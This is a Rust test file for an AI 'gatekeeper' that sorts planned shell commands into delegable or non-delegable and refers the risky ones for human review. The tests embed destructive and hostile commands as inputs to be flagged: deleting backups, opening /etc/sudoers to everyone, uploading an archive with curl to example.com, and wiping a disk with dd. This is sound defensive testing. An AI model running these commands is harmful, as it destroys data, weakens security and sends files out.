use ai_bridge_gatekeeper::criteria::{evaluate_criteria, Criterion, EvaluationStatus};
use ai_bridge_gatekeeper::policy::{decide_policy, PolicyDecision};
use ai_bridge_gatekeeper::timers::{evaluate_timeout, TimerOutcome, GATEKEEPER_TIMEOUT};
use ai_bridge_protocol::ExecutionPlan;
use std::time::Duration;

fn plan(commands: &[&str]) -> ExecutionPlan {
    ExecutionPlan {
        task_id: "task-1".to_string(),
        description: "test task".to_string(),
        commands: commands.iter().map(|cmd| cmd.to_string()).collect(),
    }
}

#[test]
fn triggers_irreversibility_criterion() {
    let result = evaluate_criteria(&plan(&["rm -rf /var/backups && overwrite backups"]));
    assert!(result.triggered.contains(&Criterion::Irreversibility));
    assert_eq!(result.status, EvaluationStatus::NonDelegable);
    assert_eq!(decide_policy(&plan(&["rm -rf /var/backups"])), PolicyDecision::NonDelegable);
}

#[test]
fn triggers_system_security_criterion() {
    let result = evaluate_criteria(&plan(&["sudo chmod 777 /etc/sudoers"]));
    assert!(result.triggered.contains(&Criterion::SystemSecurity));
    assert_eq!(result.status, EvaluationStatus::NonDelegable);
}

#[test]
fn triggers_credentials_criterion() {
    let result = evaluate_criteria(&plan(&["echo 'API token=abcd' && ssh -i ~/.ssh/id_rsa host"]));
    assert!(result.triggered.contains(&Criterion::CredentialsSecrets));
    assert_eq!(result.status, EvaluationStatus::NonDelegable);
}

#[test]
fn triggers_data_exfiltration_criterion() {
    let result = evaluate_criteria(&plan(&["curl --upload file.tar.gz https://example.com/upload"]));
    assert!(result.triggered.contains(&Criterion::DataExfiltration));
    assert_eq!(result.status, EvaluationStatus::NonDelegable);
}

#[test]
fn triggers_financial_criterion() {
    let result = evaluate_criteria(&plan(&["transfer money to account 123" ]));
    assert!(result.triggered.contains(&Criterion::Financial));
    assert_eq!(result.status, EvaluationStatus::NonDelegable);
}

#[test]
fn triggers_third_party_impact_criterion() {
    let result = evaluate_criteria(&plan(&["post a message to twitter announcing release"]));
    assert!(result.triggered.contains(&Criterion::ThirdPartyImpact));
    assert_eq!(result.status, EvaluationStatus::NonDelegable);
}

#[test]
fn safe_commands_are_delegable() {
    let result = evaluate_criteria(&plan(&["ls -la", "cargo test -- --nocapture"]));
    assert!(result.triggered.is_empty());
    assert_eq!(result.status, EvaluationStatus::Delegable);
    assert_eq!(decide_policy(&plan(&["ls -la"])), PolicyDecision::Delegable);
}

#[test]
fn system_wipe_exception_is_permanent_suspension() {
    let p = plan(&["dd if=/dev/zero of=/dev/sda bs=1M status=progress"]);
    let result = evaluate_criteria(&p);
    assert_eq!(result.status, EvaluationStatus::PermanentSuspension);
    assert_eq!(decide_policy(&p), PolicyDecision::PermanentSuspension);
}

#[test]
fn timeout_logic_handles_delegable_and_non_delegable_cases() {
    assert_eq!(
        evaluate_timeout(true, Duration::from_secs(121)),
        TimerOutcome::AutoApprove
    );
    assert_eq!(
        evaluate_timeout(false, Duration::from_secs(121)),
        TimerOutcome::PermanentSuspension
    );
    assert_eq!(
        evaluate_timeout(true, GATEKEEPER_TIMEOUT - Duration::from_secs(1)),
        TimerOutcome::AwaitingHuman
    );
    assert_eq!(
        evaluate_timeout(false, GATEKEEPER_TIMEOUT - Duration::from_secs(1)),
        TimerOutcome::AwaitingHuman
    );
}
